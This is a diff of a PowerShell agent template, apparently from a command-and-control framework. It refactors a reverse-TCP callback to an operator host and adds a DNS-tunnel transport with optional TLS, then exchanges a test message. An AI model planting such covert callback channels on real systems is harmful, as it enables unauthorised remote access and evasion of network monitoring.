@@ -16,29 +16,37 @@ $TIMEOUT = "SYREPLACE_TIMEOUT"
 $RETRIES = "SYREPLACE_RETRIES"
 
 if ($CONNECTIONMETHOD -eq "REVERSETCP") {
-    $tcp = Transport-ReverseTcp-Open -LHost $CONNECTHOST -LPort $CONNECTPORT
-    if ($CHANNELENCRYPTION -eq "NONE") {
-        Write-Output "Warning: CONNECTION UNENCRYPTED"
-        $transport = $tcp
-    } elseif ($CHANNELENCRYPTION -eq "TLS") {
-        $transport = Transport-Tls-Open $tcp.tcpStream $servercertfp
-    } else {
-        Write-Output "ERROR: wrapper method not defined"
-    }
-
-    $res = Message-ParseFromTransport $transport
-    $res.content -join '' | Write-Output
-    $message1 = Message-Create -MType 4 -Content "Test"
-    Message-SendToTransport $message1 $transport
-    $res = Message-ParseFromTransport $transport
-    $res.content -join '' | Write-Output
-
-    if ($CHANNELENCRYPTION -eq "TLS") {
-        Transport-Tls-Close $transport
-    }
-
-    Transport-ReverseTcp-Close $tcp
+    $initialtransport = Transport-ReverseTcp-Open -LHost $CONNECTHOST -LPort $CONNECTPORT
+} elseif ($CONNECTIONMETHOD -eq "DNS") {
+    $initialtransport = Transport-Dns-Open -Zone $DNSZONE -DnsServer $DNSSERVER -timeout $TIMEOUT -retries $RETRIES
 } else {
     Write-Output "ERROR: connection method not defined"
+    Exit(1)
 }
 
+if ($CHANNELENCRYPTION -eq "NONE") {
+    Write-Output "Warning: CONNECTION UNENCRYPTED"
+    $transport = $initialtransport
+} elseif ($CHANNELENCRYPTION -eq "TLS") {
+    $transport = Transport-Tls-Open $initialtransport.tcpStream $servercertfp
+} else {
+    Write-Output "ERROR: wrapper method not defined"
+    Exit(1)
+}
+
+$res = Message-ParseFromTransport $transport
+$res.content -join '' | Write-Output
+$message1 = Message-Create -MType 4 -Content "Test"
+Message-SendToTransport $message1 $transport
+$res = Message-ParseFromTransport $transport
+$res.content -join '' | Write-Output
+
+if ($CHANNELENCRYPTION -eq "TLS") {
+    Transport-Tls-Close $transport
+}
+
+if ($CONNECTIONMETHOD -eq "REVERSETCP") {
+    Transport-ReverseTcp-Close $initialtransport
+} elseif ($CONNECTIONMETHOD -eq "DNS") {
+    Transport-Dns-Close $initialtransport
+}
